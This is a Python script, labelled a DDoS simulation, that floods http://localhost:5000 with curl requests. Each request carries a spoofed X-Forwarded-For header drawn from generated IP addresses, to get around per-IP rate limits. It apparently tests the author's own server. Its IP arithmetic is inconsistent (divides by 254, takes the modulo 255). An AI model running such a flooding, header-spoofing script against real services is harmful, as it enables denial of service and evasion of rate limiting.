import subprocess
import concurrent.futures
import time

NUM_IPS = 255 ** 4 # Adjust to a smaller number for testing purposes
NUM_REQUESTS = 40  

def send_requests_from_ip(ip):
    print(f"Starting requests from IP {ip}")
    for i in range(NUM_REQUESTS):
        try:
            print(f"IP {ip}: Sending request {i + 1}")
            subprocess.run([
                'curl', 
                '-s',  
                '-o', '/dev/null',  
                '--header', f'X-Forwarded-For: {ip}',  
                'http://localhost:5000'
            ])
        except Exception as e:
            print(f"Error sending request {i + 1} from IP {ip}: {e}")

def generate_unique_ip_triplet(index):
    def generate_ip(index):
        # Divide index into 4 octets, each octet ranges from 0 to 254
        octet1 = (index // (254 * 254 * 254)) % 255
        octet2 = (index // (254 * 254)) % 255
        octet3 = (index // 254) % 255
        octet4 = index % 255

        # Combine octets into an IP address
        return f"{octet1}.{octet2}.{octet3}.{octet4}"

    # Generate three consecutive IPs
    ip1 = generate_ip(index)
    ip2 = generate_ip(index + 1)
    ip3 = generate_ip(index + 2)

    return ip1, ip2, ip3

def main():
    start_time = time.time()

    print(f"Starting the DDoS simulation with {NUM_IPS} IPs, each sending {NUM_REQUESTS} requests.")

    with concurrent.futures.ThreadPoolExecutor() as ip_executor:
        for i in range(0, NUM_IPS, 3):  # Increment by 3 to generate 3 IPs at a time
            ip1, ip2, ip3 = generate_unique_ip_triplet(i)
            ip_executor.submit(send_requests_from_ip, ip1)
            ip_executor.submit(send_requests_from_ip, ip2)
            ip_executor.submit(send_requests_from_ip, ip3)

    total_time = time.time() - start_time
    print(f"\nDDoS simulation completed in {total_time:.2f} seconds.")

if __name__ == "__main__":
    main()
